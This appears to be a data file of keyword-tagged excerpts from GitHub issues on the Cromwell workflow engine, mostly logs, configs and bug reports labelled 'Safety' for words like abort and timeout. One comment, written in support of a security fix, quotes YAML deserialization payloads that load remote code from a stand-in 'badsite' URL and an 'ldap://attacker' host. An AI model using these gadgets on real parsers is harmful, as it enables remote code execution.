Safety,":expanse_figures.CBL_assoc:-1:1-20000000025 [b303ae23expanse_figures.CBL_assoc:NA:1]: Unrecognized runtime attribute keys: shortTask, dx_timeout; [2023-03-29 13:07:47,67] [info] BT-322 58e64982:expanse_figures.CBL_assoc:-1:1 cache hit copying success with aggregated hashes: initial = B4BFDDD19BC42B30ED73AB035F6BF1DE, file = C3078AB9F63DD3A59655953B1975D6CF.; [2023-03-29 13:07:47,67] [info] 58e64982-cf3d-4e77-ad72-acfda8299d1b-EngineJobExecutionActor-expanse_figures.CBL_assoc:NA:1 [58e64982]: Call cache hit process had 0 total hit failures before completing successfully; ```. Can someone help me diagnose why call caching isn't near instantaneous, and what I can do to make it much faster? Happy to provide more information as necessary. Thanks!. Config:; ```; # See https://cromwell.readthedocs.io/en/stable/Configuring/; # this configuration only accepts double quotes! not singule quotes; include required(classpath(""application"")). system {; abort-jobs-on-terminate = true; io {; number-of-requests = 30; per = 1 second; }; file-hash-cache = true; }. # necessary for call result caching; # will need to stand up the MySQL server each time before running cromwell; # stand it up on the same node that's running cromwell; database {; profile = ""slick.jdbc.MySQLProfile$""; db {; driver = ""com.mysql.cj.jdbc.Driver""; url = ""jdbc:mysql://localhost/cromwell?rewriteBatchedStatements=true""; user = ""root""; password = ""pass""; connectionTimeout = 5000; }; }. call-caching {; enabled = true; invalidate-bad-cache-results = true; }. docker {; hash-lookup {; enabled = true; method = ""remote""; }; }. backend {; # which backend do you want to use?; # Right now I don't know how to choose this via command line, only here; default = ""Local"" # For running jobs on an interactive node; #default = ""SLURM"" # For running jobs by submitting them from an interactive node to the cluster; providers { ; # For running jobs on an interactive node; Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigB",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7108:3104,abort,abort-jobs-on-terminate,3104,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7108,1,['abort'],['abort-jobs-on-terminate']
Safety,"; <tab><tab>echo test; <tab>}. <tab>output {; <tab>}; }; ```. Full stacktrace:; ```; [2018-08-29 09:25:20,10] [error] WorkflowManagerActor Workflow 1ed0e19c-fa18-4241-8f6b-0b72e181f59a failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; Boxed Error; scala.concurrent.impl.Promise$.resolver(Promise.scala:83); scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:280); scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:341); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:341); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:341); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:99); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:269); cats.effect.IO.unsafeToFuture(IO.scala:341); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:152); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); scala.runtime.java8.JFunction0",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4051:1865,unsafe,unsafeToFuture,1865,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4051,1,['unsafe'],['unsafeToFuture']
Safety,"; [2018-10-23 17:49:32,18] [info] Shutting down JobExecutionTokenDispenser - Timeout = 5 seconds; [2018-10-23 17:49:32,19] [info] JobExecutionTokenDispenser stopped; [2018-10-23 17:49:32,19] [info] WorkflowStoreActor stopped; [2018-10-23 17:49:32,20] [info] WorkflowLogCopyRouter stopped; [2018-10-23 17:49:32,20] [info] Shutting down WorkflowManagerActor - Timeout = 3600 seconds; [2018-10-23 17:49:32,20] [info] WorkflowManagerActor All workflows finished; [2018-10-23 17:49:32,20] [info] Connection pools shut down; [2018-10-23 17:49:32,20] [info] WorkflowManagerActor stopped; [2018-10-23 17:49:32,21] [info] Shutting down SubWorkflowStoreActor - Timeout = 1800 seconds; [2018-10-23 17:49:32,21] [info] Shutting down JobStoreActor - Timeout = 1800 seconds; [2018-10-23 17:49:32,21] [info] SubWorkflowStoreActor stopped; [2018-10-23 17:49:32,21] [info] Shutting down CallCacheWriteActor - Timeout = 1800 seconds; [2018-10-23 17:49:32,21] [info] CallCacheWriteActor Shutting down: 0 queued messages to process; [2018-10-23 17:49:32,21] [info] JobStoreActor stopped; [2018-10-23 17:49:32,21] [info] Shutting down ServiceRegistryActor - Timeout = 1800 seconds; [2018-10-23 17:49:32,21] [info] Shutting down DockerHashActor - Timeout = 1800 seconds; [2018-10-23 17:49:32,21] [info] WriteMetadataActor Shutting down: 0 queued messages to process; [2018-10-23 17:49:32,21] [info] KvWriteActor Shutting down: 0 queued messages to process; [2018-10-23 17:49:32,21] [info] Shutting down IoProxy - Timeout = 1800 seconds; [2018-10-23 17:49:32,22] [info] ServiceRegistryActor stopped; [2018-10-23 17:49:32,22] [info] CallCacheWriteActor stopped; [2018-10-23 17:49:32,23] [info] DockerHashActor stopped; [2018-10-23 17:49:32,23] [info] IoProxy stopped; [2018-10-23 17:49:32,26] [info] Database closed; [2018-10-23 17:49:32,26] [info] Stream materializer shut down; [2018-10-23 17:49:32,27] [info] WDL HTTP import resolver closed; Workflow d186ca94-b85b-4729-befc-8ad28a05976c transitioned to state Failed; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-432449856:7701,Timeout,Timeout,7701,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-432449856,8,['Timeout'],['Timeout']
Safety,"; [2019-01-07 16:21:33,03] [info] WorkflowStoreActor stopped; [2019-01-07 16:21:33,03] [info] Shutting down JobExecutionTokenDispenser - Timeout = 5 seconds; [2019-01-07 16:21:33,05] [info] JobExecutionTokenDispenser stopped; [2019-01-07 16:21:33,05] [info] WorkflowLogCopyRouter stopped; [2019-01-07 16:21:33,05] [info] Shutting down WorkflowManagerActor - Timeout = 3600 seconds; [2019-01-07 16:21:33,05] [info] WorkflowManagerActor All workflows finished; [2019-01-07 16:21:33,05] [info] WorkflowManagerActor stopped; [2019-01-07 16:21:33,05] [info] Connection pools shut down; [2019-01-07 16:21:33,07] [info] Shutting down SubWorkflowStoreActor - Timeout = 1800 seconds; [2019-01-07 16:21:33,07] [info] Shutting down JobStoreActor - Timeout = 1800 seconds; [2019-01-07 16:21:33,08] [info] Shutting down CallCacheWriteActor - Timeout = 1800 seconds; [2019-01-07 16:21:33,08] [info] Shutting down ServiceRegistryActor - Timeout = 1800 seconds; [2019-01-07 16:21:33,08] [info] Shutting down DockerHashActor - Timeout = 1800 seconds; [2019-01-07 16:21:33,08] [info] Shutting down IoProxy - Timeout = 1800 seconds; [2019-01-07 16:21:33,08] [info] SubWorkflowStoreActor stopped; [2019-01-07 16:21:33,08] [info] JobStoreActor stopped; [2019-01-07 16:21:33,08] [info] CallCacheWriteActor Shutting down: 0 queued messages to process; [2019-01-07 16:21:33,08] [info] WriteMetadataActor Shutting down: 0 queued messages to process; [2019-01-07 16:21:33,09] [info] KvWriteActor Shutting down: 0 queued messages to process; [2019-01-07 16:21:33,09] [info] DockerHashActor stopped; [2019-01-07 16:21:33,09] [info] CallCacheWriteActor stopped; [2019-01-07 16:21:33,09] [info] ServiceRegistryActor stopped; [2019-01-07 16:21:33,10] [info] IoProxy stopped; [2019-01-07 16:21:33,14] [info] Database closed; [2019-01-07 16:21:33,14] [info] Stream materializer shut down; [2019-01-07 16:21:33,15] [info] WDL HTTP import resolver closed; Workflow 18de8166-5f29-4288-9fa4-6741565446fd transitioned to state Failed; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4526:7422,Timeout,Timeout,7422,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4526,8,['Timeout'],['Timeout']
Safety,"; }; }. # Here is where you can define the backend providers that Cromwell understands.; # The default is a local provider.; # To add additional backend providers, you should copy paste additional backends; # of interest that you can find in the cromwell.example.backends folder; # folder at https://www.github.com/broadinstitute/cromwell; # Other backend providers include SGE, SLURM, Docker, udocker, Singularity. etc.; # Don't forget you will need to customize them for your particular use case.; backend {; # Override the default backend.; default = slurm. # The list of providers.; providers {; # Copy paste the contents of a backend provider in this section; # Examples in cromwell.example.backends include:; # LocalExample: What you should use if you want to define a new backend provider; # AWS: Amazon Web Services; # BCS: Alibaba Cloud Batch Compute; # TES: protocol defined by GA4GH; # TESK: the same, with kubernetes support; # Google Pipelines, v2 (PAPIv2); # Docker; # Singularity: a container safe for HPC; # Singularity+Slurm: and an example on Slurm; # udocker: another rootless container solution; # udocker+slurm: also exemplified on slurm; # HtCondor: workload manager at UW-Madison; # LSF: the Platform Load Sharing Facility backend; # SGE: Sun Grid Engine; # SLURM: workload manager. # Note that these other backend examples will need tweaking and configuration.; # Please open an issue https://www.github.com/broadinstitute/cromwell if you have any questions; slurm {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; # Root directory where Cromwell writes job results in the container. This value; # can be used to specify where the execution folder is mounted in the container.; # it is used for the construction of the docker_cwd string in the submit-docker; # value above.; dockerRoot = ""/cromwell-executions"". concurrent-job-limit = 10; # If an 'exit-code-timeout-seconds' value is specified:; # - check-alive will be run at ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6933:5666,safe,safe,5666,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6933,1,['safe'],['safe']
Safety,"<!--; Hi! Thanks for taking the time to report feedback. Before posting an issue here, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're in the right place. -->. **Which backend are you running?**. broadinstitute/cromwell:36. **Paste/Attach your workflow if possible**. For any workflow, when I query its metadata endpoint with `excludeKey=calls` parameter, it returns a response with all `""calls""` key nevertheless. This doesn't seem to happen to other keys, like `inputs` or `submittedFiles`. Excluding `calls` would make a huge difference for us, because for large workflows it takes a long time for Cromwell to aggregate all calls, the response becomes large, and sometimes it even timeouts. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4362:1126,timeout,timeouts,1126,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4362,1,['timeout'],['timeouts']
Safety,"<!--; Hi! Thanks for taking the time to report feedback. Before posting an issue here, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're in the right place. -->. <!-- Which backend are you running? -->; Backend:; Local, no conf file. <!-- Paste/Attach your workflow if possible: -->. Workflow: Files are here:; https://github.com/FredHutch/reproducible-workflows/tree/master/CWL/SingleStepWorkflow. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->. Details (see also [this post](https://gatkforums.broadinstitute.org/wdl/discussion/23265/cwl-workflow-fails-running-locally#latest)):. I can run this workflow just fine using cwltool/cwl-runner as follows:. ```; cwl-runner bwa-memWorkflow.cwl localInputs.yml; ```. When I try and run it with cromwell I get an error that ""The job was aborted from outside Cromwell"" but I definitely did not abort it myself. Here is the command I used to run this workflow in Cromwell:. ```; java -jar cromwell-36.jar run bwa-memWorkflow.cwl -i localInputs.yml -p bwa-pe.cwl.zip; ```. (`bwa-pe.cwl.zip` just contains the dependency `bwa-pe.cwl`). And here's the full output of it:. https://gist.github.com/dtenenba/61bcf60f129b817cd894ee222789369a. My ultimate goal is to switch over to the AWS Batch back end (in case you are wondering why I don't just stick with cwltool) but first I wanted to get the workflow running locally in cromwell. Any ideas about this?",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4587:1287,abort,aborted,1287,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4587,2,['abort'],"['abort', 'aborted']"
Safety,"<!--; Hi! Thanks for taking the time to report feedback. Please check whether your question is already answered in our:; Documentation http://cromwell.readthedocs.io/en/develop/; Bioinformatics Stack Exchange https://bioinformatics.stackexchange.com/search?q=cromwell; Slack https://join.slack.com/t/cromwellhq/shared_invite/zt-dxmmrtye-JHxwKE53rfKE_ZWdOHIB4g; -->. <!-- Are you seeing something that looks like a bug? Please attach as much information as possible. -->. # Description. I believe this is a bug. I tried to use `stderr()` in the `output` section of a `workflow`, rather than the output section of a `task`. The resulting WDL validated fine using `womtool validate` (and it validated fine on Terra with the automatic validation they do). But the job would run about halfway and then automatically switch to ""Aborting"" status with no explanation or error message. The workflow would eventually fail after a huge delay (about 22 hours), and there would be no real error message. All tasks that ran were successful (but not all tasks ran). # Minimal WDL example. Here is a working example:. ```wdl; version 1.0. workflow my_workflow {; call my_task; }. task my_task {; command {; echo ""hello world""; }; output {; File out = stdout(); }; }; ```. And here is a non-working example that still validates fine using `womtool validate`:. ```wdl; version 1.0. workflow my_workflow {; input {; Boolean run_task; }. if (run_task) {; call my_task; }. output {; File out = select_first([my_task.out, stdout()]); }; }. task my_task {; command {; echo ""hello world""; }; output {; File out = stdout(); }; }; ```. The above gives; ```console; (cromwell) [sfleming@laptop:~/cromwell]$ womtool validate test.wdl ; Success!; ```. # The problem. The problem is that the non-working WDL example above should not validate successfully, as it is NOT a valid WDL. The `stdout()` built-in inside the `select_first()` in the `output` block of the `workflow` is not actually allowed. It will cause a very bizarre err",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6976:822,Abort,Aborting,822,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6976,1,['Abort'],['Aborting']
Safety,"<img width=""795"" alt=""screen shot 2018-06-15 at 9 44 14 am"" src=""https://user-images.githubusercontent.com/14941133/41471529-e9b665be-7081-11e8-86e3-1a4804d71adf.png"">. Workflow status `Aborted`, executionStatus/backendStatus `Running`, PAPI Operation status `done:false`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3758#issuecomment-397628329:186,Abort,Aborted,186,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3758#issuecomment-397628329,1,['Abort'],['Aborted']
Safety,"> > I'm not sure if this would give us some additional performance boost, since we'll need to check each record for matching our criteria.; > ; > But sooner or later we have to do that anyway on the summarization side (and probably on the order of 99% of metadata doesn't need summarizing). By doing it before we write to the DB, I think we could avoid:; > ; > 1. Writing the entries we know don't need to be summarized to the summarization queue.; > 2. Reading the non-summarizable metadata _value_s from the database into Cromwell (and some of them are pretty big) - only to discard them when we read the key and discover it's not summarizable. I'm still reluctant to do that:; 1. Yes, but writing a single additional number per entry to a summary table is not nearly a huge overhead, taking into attention that, as you said, in the same transaction we are writing some huge metadata entries into the `metadata_entry` table.; 2. Summarizer works asynchronously and though I agree that we should keep it's performance good enough, moving metadata key filtering logic to the ""write-metadata-entry"" side of things may affect performance of running workflows.; > Reading the non-summarizable metadata _value_s from the database into Cromwell. Also, if my understanding is correct, this is how summarizer works right now. There are other possible things which we can do to optimize summarizer performance, one of which would be to add additional `metadata_key` column to our new queue table, and then allow summarizer to decide if it wants to fetch data from `metadata_entry` table based on that key. But this is food for thought for future optimizations.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5409#issuecomment-585322534:347,avoid,avoid,347,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5409#issuecomment-585322534,1,['avoid'],['avoid']
Safety,"> Could this be related to #4497?. Perhaps, but abort-status-issues have generally been associated with `METADATA_ENTRY` and `WORKFLOW_STORE_ENTRY` getting out of sync. Those two tables are technically in different sub-systems, with `WORKFLOW_STORE_ENTRY` internally tracking running workflows for the engine and `METADATA_ENTRY` reporting back statuses to external users. However, in the above issue, I believe this is a new case of the two ""reporter"" tables `METADATA_ENTRY` and now `WORKFLOW_METADATA_SUMMARY_ENTRY` out of (expected) sync. The way to further diagnose any of these issues would be to look for rows in each of the three tables-- filtered by the aberrant workflow ids-- and see which of the tables are not in the desired state.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4511#issuecomment-452370658:48,abort,abort-status-issues,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4511#issuecomment-452370658,1,['abort'],['abort-status-issues']
Safety,"> Do we want to have an concurrency protection on this action (eg to run at most 1 docker build at a time?) to avoid awkward race conditions (or merge conflicts) in cromwhelm if two actions are competing to update the helm chart at the same time?. I have been exercising this condition fairly regularly over the last few days while pushing changes and it doesn't seem to cause any problems. The build takes a consistent 6 minutes; if I push 3 changes at 1 minute increments, the builds run on parallel nodes and finish in the order they started.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6739#issuecomment-1105713043:111,avoid,avoid,111,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6739#issuecomment-1105713043,1,['avoid'],['avoid']
Safety,"> Does it mean that the credentials, which Travis and Jenkins use, are default credentials and the purpose of this task is to set other ones and check that four tests were successfully passed?. Using ""default credentials"" means that any one of a very long list of configuration setups are auto-detected by the AWS Java SDK. In each SDK-configuration case, the credentials are **not** read from the cromwell-config file and then the values passed on to the AWS SDK. Instead the SDK ""discovers"" them. https://docs.aws.amazon.com/sdk-for-java/v2/developer-guide/credentials.html#credentials-default. This ticket is to instead wire in credentials to the SDK via [Explicitly Specifying Credentials](https://docs.aws.amazon.com/sdk-for-java/v2/developer-guide/credentials.html#credentials-explicit). In the tests:; - Each of the ""[Default Credential Provider](https://docs.aws.amazon.com/sdk-for-java/v2/developer-guide/credentials.html#credentials-default)"" options would not be configured on the system; - The `java -Dconfig.file=..."" would contain the AWS key, secret and probably region; - When the various AWS SDK functions run, they each use the passed in credentials to run the commands for S3, Batch, etc.; - The jobs should still run to completion",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4740#issuecomment-505233165:294,detect,detected,294,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4740#issuecomment-505233165,2,['detect'],['detected']
Safety,"> Hey @kevin-furant, we had success getting it working. Are you seeing any weird logs? Is your Cromwell instance correctly resolving the docker digest (so it's requesting an image like ""imageName@sha256:ad21[...]"")?. We cannot use Docker on our cluster, I use a Singularity image file; ` SGE {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {. # Limits the number of concurrent jobs; concurrent-job-limit = 300. # If an 'exit-code-timeout-seconds' value is specified:; # - check-alive will be run at this interval for every job; # - if a job is found to be not alive, and no RC file appears after this interval; # - Then it will be marked as Failed.; # Warning: If set, Cromwell will run 'check-alive' for every job at this interval. exit-code-timeout-seconds = 120. runtime-attributes = """"""; Int cpu = 1; Float memory_gb = 1; String? docker_mount; String? docker; String? sge_queue = ""bc_b2c_rd.q,b2c_rd_s1.q""; String? sge_project = ""P18Z15000N0143""; """""". runtime-attributes-for-caching {; # singularity_image: true; }. submit = """"""; qsub \; -terse \; -V \; -b y \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; ${""-l vf="" + memory_gb + ""g""} \; ${""-l p="" + cpu } \; ${""-q "" + sge_queue} \; ${""-P "" + sge_project} \; /usr/bin/env bash ${script}; """""". submit-docker = """"""; IMAGE=/zfsyt1/B2C_RD_P2/USER/fuxiangke/wgs_server_mode_0124/${docker}.sif; qsub \; -terse \; -V \; -b y \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; ${""-l vf="" + memory_gb + ""g""} \; ${""-l p="" + cpu } \; ${""-q "" + sge_queue} \; ${""-P "" + sge_project} \; singularity exec --containall --bind ${docker_mount}:${docker_mount} --bind ${cwd}:${cwd} --bind ${cwd}:${docker_cwd} $IMAGE /bin/bash ${script}; """""". kill = ""qdel ${job_id}""; check-alive = ""qstat -j ${job_id}""; job-id-regex = ""(\\d+)""; }; `; ` runtime {; docker: ""qc_align""; docker_mount: ""/zfsyt1/B2C_RD_P2/USER/fuxiangke/wgs_server_mode_0124""; cpu: cpu; memory: ""~{mem}GB"" ; };",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5405#issuecomment-1047370680:479,timeout,timeout-seconds,479,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5405#issuecomment-1047370680,2,['timeout'],['timeout-seconds']
Safety,"> How about Centaur tests that submitting pictures of Gumby now produces 4xx errors (and whatever else this fixes)?. I wish! Centaur only handles `200 OK` responses. This fix returns a `400 Bad Request`, quickly, instead of a timeout.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2500#issuecomment-318531402:226,timeout,timeout,226,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2500#issuecomment-318531402,1,['timeout'],['timeout']
Safety,"> I sometimes seem to be getting timeouts on smaller databases (300 seconds for a 2GB file), I think this might be due to Cromwell terminating incorrectly and it not starting up again. If the database is on NFS it might not be cached locally. And with a 100mbit connection it might happen. But this is just speculation. Anyway, I hope my PR on liquibase gets merged soon so I can continue working on the problem.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-629968131:33,timeout,timeouts,33,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-629968131,1,['timeout'],['timeouts']
Safety,"> I'm not sure if this would give us some additional performance boost, since we'll need to check each record for matching our criteria. But sooner or later we have to do that anyway on the summarization side (and probably on the order of 99% of metadata doesn't need summarizing). By doing it before we write to the DB, I think we could avoid:. 1. Writing the entries we know don't need to be summarized to the summarization queue.; 2. Reading the non-summarizable metadata _value_s from the database into Cromwell (and some of them are pretty big) - only to discard them when we read the key and discover it's not summarizable.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5409#issuecomment-584890956:338,avoid,avoid,338,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5409#issuecomment-584890956,1,['avoid'],['avoid']
Safety,"> I'm wondering - what would be the return code for the second worker that cannot create the lock? What in the above says ""Try to make the lock, if it doesn't work, come back and try again (and do this until the container is available.). This is the default behaviour of `flock`, I believe. My flock man page says: ""By default, if the lock cannot be immediately acquired, flock waits until the lock is available."". > Overall I think this is a really important thing to think about - aside from cluster resources, if you are pulling an image from a remote registry, that might have negative consequences for the registry. My understanding of Singularity was that the actual *pulling* would be cached using the Singularity cache, and only the *building* would be duplicated. Is this not right? In any case, this will avoid smashing the Singularity cache at least. > I also wouldn't be sparse with the variables, for some future user coming to read this, I would use --exclusive instead of -x and then --unlock instead of -u so it's explicitly clear. Agreed! I'll edit the OP.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-509639973:815,avoid,avoid,815,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-509639973,2,['avoid'],['avoid']
Safety,"> If it works the same approach would allow for recovery in the case of Spot interruption. By the way, speaking of this, how would I submit a job to an on-demand compute environment manually? It seems whenever I submit a workflow to cromwell, it always runs in a spot instance.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730590208:48,recover,recovery,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730590208,1,['recover'],['recovery']
Safety,"> Is it right that like the test didn't like the fact that workflows stayed in the store for too long, even if they all eventually ran? So the submission time sort makes sure that workflows run closer to the order in which they are submitted. @aednichols yes that is correct. So previously, we used to sort by hog group name if there was a tie for lowest workflow running count, and because of this hog groups which started with higher alphabets (c, d, e, f) in Centaur tests were at disadvantage (because hog group names would be first 8 characters of workflow ID) and workflow IDs starting with numbers or lower alphabets would always be picked up causing Centaur to timeout. This should now not happen as we would sort by submission time when there is a tie. >Are there any metrics we can add to look out in advance for disadvantaged users?. @cjllanwarne A separate ticket was created for metrics - [BW-1121](https://broadworkbench.atlassian.net/browse/BW-1121).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6709#issuecomment-1068427838:669,timeout,timeout,669,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6709#issuecomment-1068427838,1,['timeout'],['timeout']
Safety,"> It looks like upgrading from `Constructor` to `SafeConstructor` does not make much difference. I wonder if it is due to Scala not having a `javax.script.ScriptEngineManager` or other difference in class loading?. Previously we (cwlviewer) were using a plain `Yaml()` object which defaults to the `Constructor`: https://bitbucket.org/asomov/snakeyaml/src/5e41c378e49c9b363055ac8b0386b69cb3f389d2/src/main/java/org/yaml/snakeyaml/Yaml.java#lines-66 and this led to the vulnerability. Perhaps you can construct a Scala proof of concept (and therefore test) by serializing the Scala equivalent of ; ``` java; URL[] urls = new URL[1];; urls[0] = new URL(""https://www.badsite.org/payload"");; ScriptEngineManager foo = new ScriptEngineManager(new java.net.URLClassLoader(urls));; yaml.dump(foo);; ```. https://github.com/mbechler/marshalsec/blob/master/marshalsec.pdf suggests the following yaml to try as well:; ``` yaml; !!com.sun.rowset.JdbcRowSetImpl; dataSourceName: ldap://attacker/obj; autoCommit: true; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932291331:49,Safe,SafeConstructor,49,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932291331,1,['Safe'],['SafeConstructor']
Safety,"> Looks good, what were the results of running this to the point that Cromwell did not return a successful response?. It either fails with OOM or becomes totally unresponsive for a long time, while writing different kinds of timeout messages to the log (like ""timeout while trying to fetch new workflows"" or something like that).; Regarding number of rows, I remember that it handled 1.500.000 easily (carbonited within minute or two). I didn't look for precise upper bound, but I think that for 15.000.000 it was failing",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5525#issuecomment-638307488:225,timeout,timeout,225,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5525#issuecomment-638307488,2,['timeout'],['timeout']
Safety,"> Looks like this PR didn't catch the test timeout increases for some reason 🤔. Yeah, that's strange. I think this has something to do with the fact that I initially created a draft PR for this branch. Then I closed the draft PR and created a new one, but looks like that didn't help.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5337#issuecomment-570604638:43,timeout,timeout,43,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5337#issuecomment-570604638,1,['timeout'],['timeout']
Safety,"> My understanding of Singularity was that the actual pulling would be cached using the Singularity cache, and only the building would be duplicated. Is this not right? In any case, this will avoid smashing the Singularity cache at least. I think that if it's the case that the (finished image) isn't in the cache, all of the workers would start building (and then not copy to the final thing given that another worker got there first). It's been a while, so it might be good to check with others on slack.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-509643616:192,avoid,avoid,192,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-509643616,1,['avoid'],['avoid']
